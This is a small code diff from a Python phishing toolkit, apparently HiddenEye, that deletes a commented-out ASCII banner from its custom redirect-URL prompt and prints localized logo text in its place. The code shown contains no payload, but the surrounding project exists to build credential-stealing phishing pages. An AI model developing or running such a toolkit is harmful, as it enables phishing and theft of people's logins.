@@ -380,15 +380,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
 
 def enter_custom_redirecting_url():  # Question where user can input custom web-link
     run_command('clear')
-    #print('''{1}
-    #    _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-
-    #    {0}http://github.com/darksecdevelopers
-
-    #    {0}** BY:DARKSEC ** 
-    # \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
+    
     print(global_localization.hidden_eye_logo)
     print(global_localization.official_website_link)
     print(global_localization.by_darksec)
